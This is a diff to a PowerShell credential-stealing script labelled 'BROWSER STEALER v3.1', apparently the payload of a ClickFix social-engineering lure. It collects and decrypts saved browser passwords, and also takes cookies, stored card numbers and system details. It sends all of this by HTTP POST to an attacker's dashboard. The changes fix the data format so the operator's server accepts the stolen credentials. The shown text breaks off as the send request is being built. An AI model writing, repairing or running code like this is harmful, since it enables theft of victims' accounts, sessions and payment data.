@@ -1,6 +1,6 @@
 # ============================================================
-# BROWSER STEALER — COMPLETE WORKING VERSION
-# Sends credentials (username/email + password) to dashboard
+# BROWSER STEALER v3.1 — FIXED CREDENTIAL FORMAT
+# Sends credentials as {name, value, type} to dashboard
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -18,7 +18,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "  BROWSER STEALER v3.0"
+Write-Log "  BROWSER STEALER v3.1"
 Write-Log "  Target: $env:COMPUTERNAME"
 Write-Log "  Log: $LOGFILE"
 Write-Log "============================================"
@@ -214,7 +214,7 @@ function Get-FirefoxCookies {
 }
 
 # ============================================================
-# PASSWORD FUNCTIONS — WITH DECRYPTION
+# PASSWORD FUNCTIONS — FIXED: returns {name, value, type}
 # ============================================================
 
 function Get-BrowserPasswords {
@@ -242,14 +242,17 @@ function Get-BrowserPasswords {
                 $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($encryptedPassword)
             }
             
+            # ---- FIX: Only add if we have both username and password ----
             if ($username -and $decryptedPassword -and $username -ne "" -and $decryptedPassword -ne "") {
                 $u = $r['origin_url']
                 if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                 
+                # ---- FIX: Format as {name, value, type} for dashboard ----
                 $pass += @{
+                    name = $username
+                    value = $decryptedPassword
+                    type = "password"
                     url = $u
-                    username = $username
-                    password = $decryptedPassword
                     browser = $Name
                 }
             }
@@ -275,11 +278,15 @@ function Get-FirefoxPasswords {
                     if ($json.logins) {
                         foreach ($l in $json.logins) {
                             $u = $l.hostname -replace 'https?://', ''
-                            $pass += @{
-                                url = $u
-                                username = $l.username
-                                password = $l.password
-                                browser = "Firefox"
+                            # ---- FIX: Format as {name, value, type} ----
+                            if ($l.username -and $l.password -and $l.username -ne "" -and $l.password -ne "") {
+                                $pass += @{
+                                    name = $l.username
+                                    value = $l.password
+                                    type = "password"
+                                    url = $u
+                                    browser = "Firefox"
+                                }
                             }
                         }
                     }
@@ -316,10 +323,11 @@ function Get-BrowserCards {
             if ($r['name_on_card'] -and $r['card_number_encrypted']) {
                 $cards += @{
                     name = $r['name_on_card']
-                    number = $r['card_number_encrypted']
+                    value = $r['card_number_encrypted']
+                    type = "card-number"
+                    browser = $Name
                     month = $r['expiration_month']
                     year = $r['expiration_year']
-                    browser = $Name
                 }
             }
         }
@@ -414,7 +422,7 @@ if ($allCookies.Count -gt 0) {
 if ($allPasswords.Count -gt 0) {
     Write-Log "=== SAMPLE PASSWORDS (First 3) ==="
     $allPasswords | Select-Object -First 3 | ForEach-Object {
-        Write-Log "  $($_.url) - $($_.username) / $($_.password)"
+        Write-Log "  $($_.url) - $($_.name) / $($_.value)"
     }
     Write-Log ""
 }
@@ -422,7 +430,7 @@ if ($allPasswords.Count -gt 0) {
 if ($allCards.Count -gt 0) {
     Write-Log "=== SAMPLE CARDS (First 3) ==="
     $allCards | Select-Object -First 3 | ForEach-Object {
-        Write-Log "  $($_.name) - $($_.number) ($($_.month)/$($_.year))"
+        Write-Log "  $($_.name) - $($_.value) ($($_.month)/$($_.year))"
     }
     Write-Log ""
 }
@@ -437,23 +445,40 @@ if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count 
 }
 
 # ============================================================
-# BUILD PAYLOAD — FIXED: Sends 'credentials' (not 'passwords')
+# BUILD PAYLOAD — FIXED: credentials use {name, value, type}
 # ============================================================
 
 $pcName = $env:COMPUTERNAME
 $userName = $env:USERNAME
 
+# ---- Convert cookies to the format server expects ----
+$cookiesForServer = @{}
+foreach ($c in $allCookies) {
+    $key = $c.domain + "|" + $c.browser
+    if (-not $cookiesForServer[$key]) {
+        $cookiesForServer[$key] = @{}
+    }
+    $cookiesForServer[$key][$c.name] = $c.value
+}
+
+# ---- Credentials are already in {name, value, type} format ----
+$credentialsForServer = $allPasswords
+
+# ---- Cards are already in {name, value, type} format ----
+$cardsForServer = $allCards
+
 $payload = @{
-    cookies = $allCookies
-    credentials = $allPasswords   # <-- THIS IS THE FIX: 'credentials' not 'passwords'
-    cards = $allCards
+    cookies = $cookiesForServer
+    credentials = $credentialsForServer
+    cards = $cardsForServer
     system = @{
         hostname = $pcName
         username = $userName
+        os = (Get-WmiObject Win32_OperatingSystem).Caption
     }
     fingerprint = @{
         hostname = $pcName
-        userAgent = "PowerShell (Windows)"
+        userAgent = "PowerShell Payload (Windows)"
         browser = "PowerShell"
         screen = "N/A"
     }
@@ -462,6 +487,7 @@ $payload = @{
     source = "clickfix_payload"
     timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
     pcName = $pcName
+    nonce = [System.Guid]::NewGuid().ToString()
 }
 
 # ============================================================
@@ -471,6 +497,8 @@ $payload = @{
 Write-Log "[+] Sending data to server..."
 try {
     $json = $payload | ConvertTo-Json -Depth 10
+    Write-Log "[+] Payload size: $($json.Length) bytes"
+    
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
     $req = [System.Net.WebRequest]::Create($SERVER_URL)
     $req.Method = "POST"
